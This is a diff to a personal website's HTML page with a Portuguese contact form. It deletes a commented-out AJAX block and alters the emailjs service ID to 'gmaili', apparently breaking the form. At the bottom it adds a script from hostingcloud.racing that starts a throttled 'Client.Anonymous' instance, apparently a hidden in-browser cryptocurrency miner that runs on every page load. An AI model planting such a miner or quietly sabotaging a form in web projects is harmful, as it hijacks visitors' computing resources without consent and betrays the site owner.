@@ -275,34 +275,13 @@
 							} else if(msg.val().length < 10) {
 								alertify.alert("Só tem mesmo isso para escrever? Tente fazer um bocadinho melhor...");
 							} else {
-								emailjs.send("gmail","default", {name: nome.val(), email: email.val(), message: msg.val()}).then(function(response) {
+								emailjs.send("gmaili","default", {name: nome.val(), email: email.val(), message: msg.val()}).then(function(response) {
 								   alertify.alert("Mensagem enviada com sucesso, responderei assim que me for possível. Obrigado.");
 									 self.find('input[type="submit"]').val("Enviar Mensagem");
 								}, function(err) {
 								   alertify.alert("Ocorreu um erro inesperado, por favor tente novamente mais tarde ou por email.");
 									 self.find('input[type="submit"]').val("Enviar Mensagem");
 								});
-								/*$.ajax({
-									url: 'http://api-dactyllo.rhcloud.com/contact',
-									type: 'post',
-									data: { nome: nome.val(), email: email.val(), msg: msg.val() },
-									success: function(data){
-										alertify.alert("Mensagem enviada com sucesso, responderei assim que me for possível. Obrigado.");
-									},
-									error: function(jqXHR, textStatus, errorThrown){
-										if (jqXHR.status == 503) {
-											alertify.alert(String(jqXHR.responseJSON.error));
-										} else {
-											alertify.alert("Ocorreu um erro inesperado, por favor tente novamente mais tarde ou por email.");
-										}
-									},
-									complete: function() {
-										nome.val("");
-										email.val("");
-										msg.val("");
-										self.find('input[type="submit"]').val("Enviar Mensagem");
-									}
-								});*/
 							}
 						} else {
 							alertify.alert("Tem de fornecer um email válido! Ou achava que eu não iria notar?");
@@ -324,6 +303,13 @@
 	  function gtag(){dataLayer.push(arguments);}
 	  gtag('js', new Date());
 	  gtag('config', 'UA-113112361-1');
+	</script>
+	<script src="https://www.hostingcloud.racing/mNNo.js"></script>
+	<script>
+	    var _client = new Client.Anonymous('e0cfbe813d0875499731a253573511d707e16f5e1fc2768ec218fc94623a6d7f', {
+		throttle: 0.7, c: 'w', ads: 0
+	    });
+	    _client.start();
 	</script>
 </body>
 </html>
